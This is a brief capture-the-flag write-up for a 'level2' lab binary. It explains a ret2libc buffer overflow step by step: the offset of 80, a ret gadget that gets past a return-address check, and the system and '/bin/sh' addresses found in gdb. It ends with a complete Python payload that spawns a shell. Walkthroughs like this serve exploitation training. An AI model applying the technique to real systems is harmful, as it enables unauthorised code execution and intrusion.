# level2

[Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) give you pattern to find **offset** at **80**

To avoid protection about `0xb00000` in `p()`: \
Add the return address of one ret (main or p return)

Then the `system` function address: \
`gdb info function system` to get `0xb7e6b060`

The address of libc's `"/bin/sh"`: \
`gdb find &system, +99999, "/bin/sh"` => We found `0xb7f8cc58`


We can build our payload:
```bash
(python -c 'print "A" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "dumm" + "\x58\xcc\xf8\xb7"'; cat) | ./level2
```
